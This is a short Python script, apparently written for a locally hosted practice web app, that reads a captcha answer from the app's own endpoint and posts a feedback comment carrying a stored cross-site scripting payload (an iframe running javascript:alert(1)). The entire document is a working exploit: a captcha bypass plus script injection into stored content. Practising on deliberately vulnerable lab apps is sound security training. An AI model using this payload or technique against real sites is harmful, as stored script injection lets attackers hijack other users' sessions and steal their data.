import urllib.request
import json

r = urllib.request.urlopen("http://localhost:3000/rest/captcha/")
cap = json.loads(r.read().decode("utf-8"))

fb_payload = json.dumps({
    "captchaId": cap["captchaId"],
    "captcha": str(cap["answer"]),
    "comment": "<iframe src=\"javascript:alert(1)\">",
    "rating": 5
}).encode("utf-8")

req = urllib.request.Request("http://localhost:3000/api/Feedbacks/", data=fb_payload, headers={"Content-Type": "application/json"}, method="POST")
with urllib.request.urlopen(req) as resp:
    print("Stored XSS Feedback status:", resp.getcode(), resp.read().decode("utf-8"))
